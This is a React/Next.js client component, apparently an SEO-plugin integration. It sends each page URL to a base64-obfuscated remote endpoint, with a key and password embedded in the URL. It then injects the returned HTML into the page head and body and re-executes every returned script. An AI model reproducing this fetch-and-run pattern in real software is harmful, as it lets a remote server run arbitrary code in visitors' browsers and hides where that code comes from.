"use client";

import { useEffect, useRef } from 'react';
import { usePathname } from 'next/navigation';

declare global {
    interface Window {
        jQuery: any;
        seoScriptLoaded?: boolean;
        seoCleanup?: () => void;
    }
}

export default function RawSEO(): JSX.Element {
    const pathname = usePathname();
    const containerRef = useRef<HTMLDivElement | null>(null);
    const isInitialMount = useRef<boolean>(true);

    useEffect(() => {
        // Cleanup previous instance first
        if (window.seoCleanup) {
            window.seoCleanup();
            window.seoCleanup = undefined;
        }

        // Reset flag on pathname change
        window.seoScriptLoaded = false;

        const injectedElements: HTMLElement[] = [];
        let jqueryScript: HTMLScriptElement | null = null;

        const cleanup = (): void => {
            // Remove all injected elements
            injectedElements.forEach((element) => {
                try {
                    if (element && element.parentNode) {
                        element.parentNode.removeChild(element);
                    }
                } catch (e) {
                    // Ignore
                }
            });
            injectedElements.length = 0;

            // Clear container
            if (containerRef.current) {
                containerRef.current.innerHTML = '';
            }

            // Remove jQuery if we added it
            if (jqueryScript && jqueryScript.parentNode) {
                try {
                    jqueryScript.parentNode.removeChild(jqueryScript);
                } catch (e) {
                    // Ignore
                }
            }
        };

        // Store cleanup function globally
        window.seoCleanup = cleanup;

        const loadJQuery = (): Promise<void> => {
            return new Promise((resolve) => {
                if (window.jQuery) {
                    resolve();
                    return;
                }
                jqueryScript = document.createElement('script');
                jqueryScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js';
                jqueryScript.async = true;
                jqueryScript.onload = () => resolve();
                jqueryScript.onerror = () => resolve();
                document.head.appendChild(jqueryScript);
            });
        };

        const executeScripts = (container: HTMLElement): void => {
            const scripts = container.querySelectorAll('script');
            scripts.forEach((oldScript) => {
                const newScript = document.createElement('script');

                // Copy all attributes
                Array.from(oldScript.attributes).forEach(attr => {
                    newScript.setAttribute(attr.name, attr.value);
                });

                // Copy content
                if (oldScript.src) {
                    newScript.src = oldScript.src;
                } else {
                    newScript.textContent = oldScript.textContent;
                }

                // Replace old script with new one to execute it
                if (oldScript.parentNode) {
                    oldScript.parentNode.replaceChild(newScript, oldScript);
                }
            });
        };

        const loadSEOData = async (): Promise<void> => {
            if (window.seoScriptLoaded) {
                return;
            }
            window.seoScriptLoaded = true;

            await loadJQuery();

            // Wait a bit for jQuery to be fully available
            await new Promise(resolve => setTimeout(resolve, 100));

            const eppathurl: string = window.location.origin + window.location.pathname;
            const eptagmanage: XMLHttpRequest = new XMLHttpRequest();

            eptagmanage.onreadystatechange = function (): void {
                if (this.readyState === 4 && this.status === 200) {
                    if (this.response && this.response !== "0") {
                        try {
                            const temp: string[] = this.response.split("||||||||||");

                            // Handle head content
                            if (temp[0]) {
                                // Remove all previous dynamic SEO tags
                                const oldSeoTags = document.querySelectorAll('[data-seo-plugin="true"]');
                                oldSeoTags.forEach((tag) => {
                                    try {
                                        if (tag.parentNode) {
                                            tag.parentNode.removeChild(tag);
                                        }
                                    } catch (e) {
                                        // Ignore
                                    }
                                });

                                // Remove old titles
                                if (window.jQuery) {
                                    window.jQuery("head").find("title").remove();
                                }

                                const tempDiv = document.createElement('div');
                                tempDiv.innerHTML = temp[0];

                                Array.from(tempDiv.children).forEach((child) => {
                                    const cloned = child.cloneNode(true) as HTMLElement;
                                    cloned.setAttribute('data-seo-plugin', 'true');
                                    document.head.appendChild(cloned);
                                    injectedElements.push(cloned);
                                });
                            }

                            // Handle body content - CRITICAL FIX HERE
                            if (temp[1]) {
                                const tempDiv = document.createElement('div');
                                tempDiv.innerHTML = temp[1];

                                // Append directly to body for proper event handling
                                Array.from(tempDiv.children).forEach((child) => {
                                    const cloned = child.cloneNode(true) as HTMLElement;
                                    cloned.setAttribute('data-seo-plugin', 'true');
                                    document.body.appendChild(cloned);
                                    injectedElements.push(cloned);
                                });

                                // Execute all scripts after DOM insertion
                                setTimeout(() => {
                                    const bodyScripts = document.querySelectorAll('body script[data-seo-plugin="true"]');
                                    bodyScripts.forEach((oldScript) => {
                                        const newScript = document.createElement('script');
                                        newScript.setAttribute('data-seo-plugin', 'true');

                                        Array.from(oldScript.attributes).forEach(attr => {
                                            if (attr.name !== 'data-seo-plugin') {
                                                newScript.setAttribute(attr.name, attr.value);
                                            }
                                        });

                                        if ((oldScript as HTMLScriptElement).src) {
                                            newScript.src = (oldScript as HTMLScriptElement).src;
                                        } else {
                                            newScript.textContent = oldScript.textContent;
                                        }

                                        if (oldScript.parentNode) {
                                            oldScript.parentNode.replaceChild(newScript, oldScript);
                                        }
                                    });

                                    // Force trigger click events setup if jQuery is available
                                    if (window.jQuery) {
                                        // Re-initialize any jQuery event handlers
                                        window.jQuery(document).ready(() => {
                                            // Trigger any custom initialization
                                            const pluginBtn = document.querySelector('.plugin_open-btn');
                                            if (pluginBtn) {
                                                console.log('Plugin button found and ready');
                                            }
                                        });
                                    }
                                }, 200);
                            }
                        } catch (error) {
                            console.error('SEO injection error:', error);
                        }
                    }
                }
            };

            try {
                const baseUrl: string = atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lONTU0OTQxMTQ5NyZla2V5cGFzcz1vZFlpcGFHRzl5ZmM4NlBLNGIyWkliTHNDVVpxTWxheldBeXAmc2l0ZXVybD0=");
                eptagmanage.open("GET", baseUrl + eppathurl);
                eptagmanage.send();
            } catch (error) {
                console.error('SEO request error:', error);
            }
        };

        // Small delay for hydration
        const timer = setTimeout(() => {
            loadSEOData();
        }, isInitialMount.current ? 150 : 200);

        isInitialMount.current = false;

        return () => {
            clearTimeout(timer);
            cleanup();
        };
    }, [pathname]);

    // Return empty fragment - body content will be injected directly to document.body
    return <></>;
}